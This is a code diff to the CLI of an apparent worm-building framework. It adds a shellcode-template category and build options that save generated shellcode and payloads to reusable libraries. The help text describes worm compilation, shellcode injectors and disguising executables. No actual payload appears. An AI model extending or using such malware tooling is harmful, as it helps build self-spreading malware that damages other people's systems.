@@ -69,6 +69,7 @@ class QueenShell:
             self.sorter("process", "The worm's code pipeline. All the steps that will be taken to create the worm. Changing the default can lead to compilation errors.")
             self.sorter("cscript", "Compiler Script. see 'show --help' for more information")
             self.sorter("food", "Special variables filled with lots of data that worms use.")
+            self.sorter("scode", "Shellcode Template to generating shellcode.")
         
         @hiveShell.command()
         def clr() -> None:
@@ -157,7 +158,8 @@ class QueenShell:
                 cprint(hw, self.color_help)
                 hw = self.texter.make_2column("-- cscript --", "(Compile Script) Generates .rc resource script files containing metadata that makes the final executable look more professional. It also allows adding icons and other visual elements. Some modules automatically create and use these scripts, but you can always add or replace them manually.")
                 cprint(hw, self.color_help)
-                
+                hw = self.texter.make_2column("-- scode --", "A collection of templates used for shellcode generation. To generate shellcode, you must select a special shellcode-generation type as the main worm module. Descriptions of modules indicate which ones support this functionality. Templates vary and include information on whether the generated shellcode may contain null bytes. In general, most injectors support injecting shellcode with null bytes.")
+                cprint(hw, self.color_help)
             
             if types:
                 self.Queen.show_items(types)
@@ -193,9 +195,11 @@ class QueenShell:
         @click.option("--no_compile", "-nc", required=False, is_flag=True, help="It does not perform compilation. It only creates a code file.")
         @click.option("--compiler", "-c", required=False, help="Name of the compiler used for compilation")
         @click.option("--payload", "-p", is_flag=True, required=False, help="Build your worm as payload. Put ready module to library")
-        def build(no_compile, compiler, payload):
-            """\nConstruction and compilation of the worm. If your worm is ready you can compile it. The compilation process takes different amounts of time and depends on the worm code and the compiler you use.
-Remember not to use compilers that are not designed for worm language. Nothing good will come out of it."""
+        @click.option("--spayload", "-sp", required=False, help="Put ready shellcode to Payload Library.")
+        @click.option("--food", "-fd", required=False, help="Add shellcode to Food library.")
+        def build(no_compile, compiler, payload, spayload, food):
+            """\nCompiles the final worm. Once you've assembled your worm, use this command to compile it. You can also generate the raw code without compiling by using the --no_compile flag. The compilation process may vary in duration depending on the code and compiler used. This command also allows you to add the generated payload or shellcode to your library for reuse in future projects.
+For more details, see build --help."""
             opt = {}
             if no_compile:
                 opt["NO_COMPILE"] = True
@@ -203,6 +207,12 @@ Remember not to use compilers that are not designed for worm language. Nothing g
                 opt["COMPILER_NAME"] = compiler
             if payload:
                 opt["PAYLOAD"] = True
+            if spayload:
+                opt["MAKE_PAYLOAD"] = True
+                opt["PAYLOAD_INFO"] = spayload
+            if food:
+                opt["MAKE_FOOD"] = True
+                opt["FOOD_INFO"] = food
             self.Queen.build_worm(opt)
         
         @hiveShell.command()
